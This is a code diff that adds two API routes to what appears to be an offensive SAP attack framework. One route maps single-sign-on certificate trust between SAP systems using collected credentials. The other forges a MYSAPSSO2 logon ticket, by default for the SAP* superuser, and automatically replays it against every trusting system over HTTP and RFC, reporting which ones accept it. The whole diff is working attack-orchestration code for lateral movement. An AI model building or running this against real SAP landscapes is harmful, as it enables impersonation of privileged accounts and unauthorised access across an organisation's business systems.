@@ -6449,6 +6449,154 @@ def create_app(api: SAPMAPApi) -> Bottle:
             _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/discover_strustsso2", method="POST")
+    def node_discover_strustsso2(sid):
+        """Discover STRUSTSSO2 trust relationships on this node.
+
+        Reads USREXTID / USRACL / SSF_C_GET_CERTIFICATE_LIST_OF_PSE
+        to identify which issuer PSEs this system trusts, then
+        cross-references each entry against known
+        SAPNode.sapsys_cert_subject_dn values to resolve issuer SIDs.
+        New TrustRelation entries are added to state.trust_relations.
+        """
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        def _run():
+            creds = node.best_credentials()
+            if not creds:
+                print(f"[-] {sid}: no credentials available for "
+                      f"STRUSTSSO2 discovery")
+                return
+            from sapmap_models import TrustRelation
+            entries = sapmap_rfc.retrieve_strustsso2_trust(node, creds)
+
+            # Build lookup of known SAPSYS cert DNs across the
+            # landscape so we can resolve issuer_sid where possible.
+            cert_to_sid = {}
+            for other_sid, other_node in api.state.nodes.items():
+                dn = (other_node.sapsys_cert_subject_dn or "").strip()
+                if dn:
+                    cert_to_sid[dn] = other_sid
+
+            existing_keys = {
+                (r.trusting_sid, r.issuer_cert_subject_dn,
+                 r.issuer_cert_serial)
+                for r in api.state.trust_relations
+            }
+
+            added = 0
+            resolved = 0
+            for e in entries:
+                subject = e.get("subject_dn", "") or ""
+                serial = e.get("serial", "") or ""
+                key = (sid, subject, serial)
+                if key in existing_keys:
+                    continue
+                issuer_sid = cert_to_sid.get(subject, "")
+                if issuer_sid:
+                    resolved += 1
+                rel = TrustRelation(
+                    trusting_sid=sid,
+                    trusting_client=e.get("trusting_client", ""),
+                    issuer_sid=issuer_sid,
+                    issuer_cert_subject_dn=subject,
+                    issuer_cert_serial=serial,
+                    trust_method="strustsso2",
+                    discovered_via=e.get("source", ""),
+                )
+                api.state.trust_relations.append(rel)
+                existing_keys.add(key)
+                added += 1
+
+            print(f"[+] {sid}: STRUSTSSO2 discovery added {added} new "
+                  f"trust relations ({resolved} resolved to known SIDs)")
+
+        _bg(f"{sid}:discover_strustsso2",
+            "Discover STRUSTSSO2 trust", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/forge_and_fanout", method="POST")
+    def node_forge_and_fanout(sid):
+        """Forge a MYSAPSSO2 ticket then auto-replay it against every
+        STRUSTSSO2-trusted receiver in state.trust_relations whose
+        issuer_sid matches this node.
+
+        Body parameters (all optional):
+            user, client, validity_min, digest, recipient_sid,
+            recipient_client, channels, timeout
+        """
+        response.content_type = "application/json"
+        data = request.json or {}
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        user = data.get("user", "SAP*")
+        client = data.get("client", "100")
+        validity_min = int(data.get("validity_min") or 120)
+        digest = data.get("digest", "sha1")
+        recipient_sid = data.get("recipient_sid") or None
+        recipient_client = data.get("recipient_client") or None
+        channels = data.get("channels") or ["http", "rfc"]
+        timeout = int(data.get("timeout") or 10)
+
+        def _run():
+            from sapmap_exploit import extract_and_forge_ticket
+            from sap_ticket_propagate import (
+                propagate_to_trusted_subgraph)
+
+            print(f"[*] {sid}: Forge & Fanout — forging ticket as "
+                  f"{user}/{client}...")
+            r = extract_and_forge_ticket(
+                node=node, state=api.state,
+                user=user, client=client,
+                validity_min=validity_min, digest=digest,
+                recipient_sid=recipient_sid,
+                recipient_client=recipient_client,
+            )
+            if not r.get("success"):
+                print(f"[-] {sid}: forgery failed: {r.get('error')}")
+                return
+            ticket = r["ticket"]
+
+            # Derive fanout targets from state.trust_relations
+            fanout_sids = []
+            for rel in api.state.trust_relations:
+                if rel.issuer_sid != sid:
+                    continue
+                if rel.trusting_sid == sid:
+                    continue
+                if rel.trusting_sid not in fanout_sids:
+                    fanout_sids.append(rel.trusting_sid)
+            if not fanout_sids:
+                print(f"[*] {sid}: no STRUSTSSO2-trusted receivers "
+                      f"known; run 'Discover STRUSTSSO2 trust' on "
+                      f"candidate systems first")
+                return
+
+            print(f"[*] {sid}: fanning out forged ticket to "
+                  f"{len(fanout_sids)} STRUSTSSO2-trusted receivers: "
+                  f"{', '.join(fanout_sids)}")
+            prop = propagate_to_trusted_subgraph(
+                ticket=ticket, state=api.state,
+                candidate_sids=fanout_sids,
+                channels=channels, timeout=timeout)
+            print(f"[+] {sid}: fanout complete — "
+                  f"{prop['succeeded']}/{prop['tried']} receivers "
+                  f"accepted the ticket")
+            for entry in prop["results"]:
+                mark = "✓" if entry["success"] else "✗"
+                ev = (entry.get("evidence")
+                      or entry.get("error", ""))[:100]
+                print(f"      [{mark}] {entry['sid']:6s} "
+                      f"{entry.get('channel', '—'):6s} {ev}")
+
+        _bg(f"{sid}:forge_and_fanout", "Forge & Fanout Ticket", _run)
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/analyse_capabilities", method="POST")
     def node_analyse_capabilities(sid):
         """Run the role / profile capability analyser against every
